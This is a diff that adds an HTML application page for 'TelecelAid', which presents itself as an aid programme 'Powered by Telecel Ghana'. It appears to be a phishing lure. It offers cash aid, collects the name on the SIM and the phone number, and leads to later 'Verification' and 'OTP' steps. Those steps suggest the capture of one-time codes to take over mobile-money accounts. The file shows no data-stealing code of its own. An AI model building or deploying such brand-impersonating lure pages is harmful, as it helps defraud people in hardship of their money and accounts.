@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Apply - TelecelAid | Powered by Telecel Ghana</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #f8f9fa 0%, #fff 100%);
+            color: #333;
+            line-height: 1.6;
+        }
+
+        :root {
+            --telecel-red: #E2001A;
+            --telecel-red-dark: #B80015;
+            --telecel-red-light: #FFE5E8;
+            --dark: #1a1a2e;
+            --gray: #6c757d;
+            --light-gray: #f8f9fa;
+            --border: #e9ecef;
+            --success: #00875A;
+            --shadow: 0 10px 40px rgba(0,0,0,0.08);
+            --shadow-sm: 0 2px 8px rgba(0,0,0,0.05);
+        }
+
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap');
+
+        .container {
+            max-width: 700px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        /* Header */
+        .header {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+
+        .logo-icon {
+            background: var(--telecel-red);
+            color: white;
+            width: 60px;
+            height: 60px;
+            border-radius: 15px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            font-weight: bold;
+            margin-bottom: 1rem;
+        }
+
+        .logo-text {
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: var(--dark);
+        }
+
+        .logo-text span {
+            color: var(--telecel-red);
+        }
+
+        .powered {
+            font-size: 0.8rem;
+            color: var(--gray);
+        }
+
+        /* Progress Bar */
+        .progress-container {
+            margin: 2rem 0;
+        }
+
+        .progress-steps {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 0.5rem;
+        }
+
+        .step-indicator {
+            text-align: center;
+            flex: 1;
+            font-size: 0.75rem;
+            color: var(--gray);
+        }
+
+        .step-indicator.active {
+            color: var(--telecel-red);
+            font-weight: 600;
+        }
+
+        .progress-bar {
+            background: var(--border);
+            height: 8px;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            background: var(--telecel-red);
+            height: 100%;
+            width: 25%;
+            border-radius: 10px;
+            transition: width 0.3s;
+        }
+
+        /* Form Card */
+        .form-card {
+            background: white;
+            border-radius: 24px;
+            padding: 2rem;
+            box-shadow: var(--shadow);
+            margin-bottom: 2rem;
+        }
+
+        .form-title {
+            font-size: 1.5rem;
+            margin-bottom: 0.5rem;
+            color: var(--dark);
+        }
+
+        .form-subtitle {
+            color: var(--gray);
+            margin-bottom: 2rem;
+            font-size: 0.9rem;
+        }
+
+        /* Form Groups */
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        label {
+            display: block;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+            color: var(--dark);
+        }
+
+        .required::after {
+            content: " *";
+            color: var(--telecel-red);
+        }
+
+        input, select, textarea {
+            width: 100%;
+            padding: 0.9rem 1rem;
+            border: 2px solid var(--border);
+            border-radius: 12px;
+            font-size: 1rem;
+            font-family: inherit;
+            transition: all 0.3s;
+            background: white;
+        }
+
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: var(--telecel-red);
+            box-shadow: 0 0 0 3px rgba(226,0,26,0.1);
+        }
+
+        input.error, select.error {
+            border-color: var(--telecel-red);
+            background: var(--telecel-red-light);
+        }
+
+        .error-message {
+            color: var(--telecel-red);
+            font-size: 0.8rem;
+            margin-top: 0.3rem;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        .hint {
+            font-size: 0.75rem;
+            color: var(--gray);
+            margin-top: 0.3rem;
+        }
+
+        /* Button */
+        .btn-next {
+            width: 100%;
+            background: var(--telecel-red);
+            color: white;
+            padding: 1rem;
+            border: none;
+            border-radius: 50px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 1rem;
+        }
+
+        .btn-next:hover {
+            background: var(--telecel-red-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(226,0,26,0.3);
+        }
+
+        .btn-next:disabled {
+            background: var(--gray);
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Back link */
+        .back-link {
+            text-align: center;
+            margin-top: 1.5rem;
+        }
+
+        .back-link a {
+            color: var(--gray);
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+
+        .back-link a:hover {
+            color: var(--telecel-red);
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 2rem;
+            border-top: 1px solid var(--border);
+            color: var(--gray);
+            font-size: 0.8rem;
+        }
+
+        /* Alert */
+        .alert {
+            background: var(--telecel-red-light);
+            border-left: 4px solid var(--telecel-red);
+            padding: 1rem;
+            border-radius: 12px;
+            margin-bottom: 1.5rem;
+            font-size: 0.85rem;
+        }
+
+        .alert strong {
+            color: var(--telecel-red);
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 1rem;
+            }
+            .form-card {
+                padding: 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="logo-icon">📱</div>
+            <div class="logo-text">Telecel<span>Aid</span></div>
+            <div class="powered">Powered by Telecel Ghana</div>
+        </div>
+
+        <!-- Progress Bar -->
+        <div class="progress-container">
+            <div class="progress-steps">
+                <div class="step-indicator active">Step 1<br>Application</div>
+                <div class="step-indicator">Step 2<br>Verification</div>
+                <div class="step-indicator">Step 3<br>OTP</div>
+                <div class="step-indicator">Step 4<br>Complete</div>
+            </div>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+        </div>
+
+        <!-- Form Card -->
+        <div class="form-card">
+            <h1 class="form-title">🎁 Apply for Aid</h1>
+            <p class="form-subtitle">Complete the form below to start your application. All fields are required.</p>
+
+            <!-- Alert Message -->
+            <div class="alert">
+                <strong>🔒 Secure Application</strong><br>
+                TelecelAid never asks for your mobile money PIN. Your information is protected.
+            </div>
+
+            <form id="applicationForm" action="verify.html" method="GET">
+                <!-- Full Name -->
+                <div class="form-group">
+                    <label class="required">👤 Full Name (as on Telecel SIM)</label>
+                    <input type="text" id="fullName" name="fullName" placeholder="e.g., John Kwame Mensah" required>
+                    <div class="hint">Must match your SIM registration exactly</div>
+                    <div class="error-message" id="nameError">Please enter your full name (minimum 3 characters)</div>
+                </div>
+
+                <!-- Telecel Number - CLEAN VERSION -->
+                <div class="form-group">
+                    <label class="required">📞 Telecel Mobile Number</label>
+                    <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="024 123 4567" required>
+                    <div class="hint">Enter a valid Telecel number (e.g., 0241234567)</div>
+                    <div class="error-message" id="phoneError">Please enter a valid Telecel number</div>
+                </div>
+
+                <!-- Region -->
+                <div class="form-group">
+                    <label class="required">📍 Region</label>
+                    <select id="region" name="region" required>
+                        <option value="">Select your region</option>
+                        <option value="Greater Accra">Greater Accra</option>
+                        <option value="Ashanti">Ashanti</option>
+                        <option value="Western">Western</option>
+                        <option value="Eastern">Eastern</option>
+                        <option value="Central">Central</option>
+                        <option value="Volta">Volta</option>
+                        <option value="Bono">Bono</option>
+                        <option value="Bono East">Bono East</option>
+                        <option value="Ahafo">Ahafo</option>
+                        <option value="Northern">Northern</option>
+                        <option value="Savannah">Savannah</option>
+                        <option value="North East">North East</option>
+                        <option value="Upper East">Upper East</option>
+                        <option value="Upper West">Upper West</option>
+                        <option value="Oti">Oti</option>
+                        <option value="Western North">Western North</option>
+                    </select>
+                    <div class="error-message" id="regionError">Please select your region</div>
+                </div>
+
+                <!-- Reason for Aid -->
+                <div class="form-group">
+                    <label class="required">🎯 Reason for Aid</label>
+                    <select id="reason" name="reason" required>
+                        <option value="">Select reason</option>
+                        <option value="Medical / Health Emergency">Medical / Health Emergency</option>
+                        <option value="Education / School Fees">Education / School Fees</option>
+                        <option value="Business Support">Business Support</option>
+                        <option value="Unemployment Relief">Unemployment Relief</option>
+                        <option value="Funeral / Bereavement Support">Funeral / Bereavement Support</option>
+                        <option value="Housing / Rent Assistance">Housing / Rent Assistance</option>
+                        <option value="Disaster / Emergency Relief">Disaster / Emergency Relief</option>
+                        <option value="Disability Support">Disability Support</option>
+                        <option value="Elderly Support">Elderly Support</option>
+                        <option value="Other">Other (please specify)</option>
+                    </select>
+                    <div class="error-message" id="reasonError">Please select a reason for aid</div>
+                </div>
+
+                <!-- Other Reason (conditional) -->
+                <div class="form-group" id="otherReasonGroup" style="display: none;">
+                    <label class="required">Please specify</label>
+                    <input type="text" id="otherReason" name="otherReason" placeholder="Enter your reason">
+                    <div class="error-message" id="otherReasonError">Please specify your reason</div>
+                </div>
+
+                <!-- Amount -->
+                <div class="form-group">
+                    <label class="required">💰 Amount Requested (GHS)</label>
+                    <input type="number" id="amount" name="amount" placeholder="500" min="50" max="2000" step="1" required>
+                    <div class="hint">Minimum GHS 50 | Maximum GHS 2,000</div>
+                    <div class="error-message" id="amountError">Amount must be between GHS 50 and GHS 2,000</div>
+                </div>
+
+                <!-- Submit Button -->
+                <button type="submit" class="btn-next" id="submitBtn">Continue to Step 2 →</button>
+            </form>
+
+            <div class="back-link">
+                <a href="index.html">← Back to Home</a>
+            </div>
+        </div>
+
+        <div class="footer">
+            © 2026 TelecelAid | Powered by Telecel Ghana
+        </div>
+    </div>
+
+    <script>
+        // Get form elements
+        const form = document.getElementById('applicationForm');
+        const fullName = document.getElementById('fullName');
+        const phoneNumber = document.getElementById('phoneNumber');
+        const region = document.getElementById('region');
+        const reason = document.getElementById('reason');
+        const otherReasonGroup = document.getElementById('otherReasonGroup');
+        const otherReason = document.getElementById('otherReason');
+        const amount = document.getElementById('amount');
+        const submitBtn = document.getElementById('submitBtn');
+
+        // Validation functions
+        function validateFullName() {
+            const name = fullName.value.trim();
+            const errorMsg = document.getElementById('nameError');
+            if (name.length < 3) {
+                fullName.classList.add('error');
+                errorMsg.classList.add('show');
+                return false;
+            } else {
+                fullName.classList.remove('error');
+                errorMsg.classList.remove('show');
+                return true;
+            }
+        }
+
+        function validatePhoneNumber() {
+            let phone = phoneNumber.value.trim();
+            // Remove all spaces
+            phone = phone.replace(/\s/g, '');
+            
+            // Check if starts with 0 and is 10 digits total
+            // Valid Telecel prefixes: 024, 054, 055, 059, 020
+            const phoneRegex = /^(024|054|055|059|020)\d{7}$/;
+            const errorMsg = document.getElementById('phoneError');
+            
+            if (!phoneRegex.test(phone)) {
+                phoneNumber.classList.add('error');
+                errorMsg.classList.add('show');
+                return false;
+            } else {
+                phoneNumber.classList.remove('error');
+                errorMsg.classList.remove('show');
+                // Store the cleaned number
+                phoneNumber.value = phone;
+                return true;
+            }
+        }
+
+        function validateRegion() {
+            const errorMsg = document.getElementById('regionError');
+            if (!region.value) {
+                region.classList.add('error');
+                errorMsg.classList.add('show');
+                return false;
+            } else {
+                region.classList.remove('error');
+                errorMsg.classList.remove('show');
+                return true;
+            }
+        }
+
+        function validateReason() {
+            const errorMsg = document.getElementById('reasonError');
+            if (!reason.value) {
+                reason.classList.add('error');
+                errorMsg.classList.add('show');
+                return false;
+            } else {
+                reason.classList.remove('error');
+                errorMsg.classList.remove('show');
+                return true;
+            }
+        }
+
+        function validateOtherReason() {
+            if (reason.value === 'Other') {
+                const otherVal = otherReason.value.trim();
+                const errorMsg = document.getElementById('otherReasonError');
+                if (!otherVal) {
+                    otherReason.classList.add('error');
+                    errorMsg.classList.add('show');
+                    return false;
+                } else {
+                    otherReason.classList.remove('error');
+                    errorMsg.classList.remove('show');
+                    return true;
+                }
+            }
+            return true;
+        }
+
+        function validateAmount() {
+            const amt = parseFloat(amount.value);
+            const errorMsg = document.getElementById('amountError');
+            if (isNaN(amt) || amt < 50 || amt > 2000) {
+                amount.classList.add('error');
+                errorMsg.classList.add('show');
+                return false;
+            } else {
+                amount.classList.remove('error');
+                errorMsg.classList.remove('show');
+                return true;
+            }
+        }
+
+        // Show/hide other reason field
+        reason.addEventListener('change', function() {
+            if (reason.value === 'Other') {
+                otherReasonGroup.style.display = 'block';
+                otherReason.required = true;
+            } else {
+                otherReasonGroup.style.display = 'none';
+                otherReason.required = false;
+                otherReason.value = '';
+            }
+        });
+
+        // Real-time validation
+        fullName.addEventListener('input', validateFullName);
+        phoneNumber.addEventListener('input', validatePhoneNumber);
+        region.addEventListener('change', validateRegion);
+        reason.addEventListener('change', function() {
+            validateReason();
+            validateOtherReason();
+        });
+        otherReason.addEventListener('input', validateOtherReason);
+        amount.addEventListener('input', validateAmount);
+
+        // Form submission
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            // Run all validations
+            const isNameValid = validateFullName();
+            const isPhoneValid = validatePhoneNumber();
+            const isRegionValid = validateRegion();
+            const isReasonValid = validateReason();
+            const isOtherReasonValid = validateOtherReason();
+            const isAmountValid = validateAmount();
+
+            if (isNameValid && isPhoneValid && isRegionValid && isReasonValid && isOtherReasonValid && isAmountValid) {
+                // Store data in sessionStorage for next page
+                const formData = {
+                    fullName: fullName.value.trim(),
+                    phoneNumber: phoneNumber.value.trim(),
+                    region: region.value,
+                    reason: reason.value === 'Other' ? otherReason.value.trim() : reason.value,
+                    amount: amount.value
+                };
+                sessionStorage.setItem('telecelAidApplication', JSON.stringify(formData));
+                
+                // Redirect to verify.html (Page 1.5)
+                window.location.href = 'verify.html';
+            } else {
+                // Scroll to first error
+                const firstError = document.querySelector('.error');
+                if (firstError) {
+                    firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                }
+            }
+        });
+    </script>
+</body>
+</html>
